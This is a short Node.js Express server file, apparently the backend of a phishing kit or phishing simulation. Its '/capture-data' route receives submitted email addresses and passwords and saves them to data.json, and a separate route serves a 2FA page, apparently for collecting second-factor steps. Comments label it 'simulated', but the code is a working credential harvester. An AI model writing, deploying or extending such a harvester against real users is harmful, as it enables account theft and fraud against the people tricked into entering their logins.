const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');

const app = express();
const port = 3000;

app.use(bodyParser.json());
app.use(express.static('public')); // Serve static files

// Capture data (simulated)
app.post('/capture-data', (req, res) => {
    const { email, password } = req.body;

    // Store captured data in a JSON file (for simulation purposes)
    const data = { email, password };
    fs.writeFileSync('./data.json', JSON.stringify(data, null, 2));

    res.json({ success: true });
});

// 2FA Simulation route
app.get('/2fa', (req, res) => {
    res.sendFile(__dirname + '/2fa/2fa.html');
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
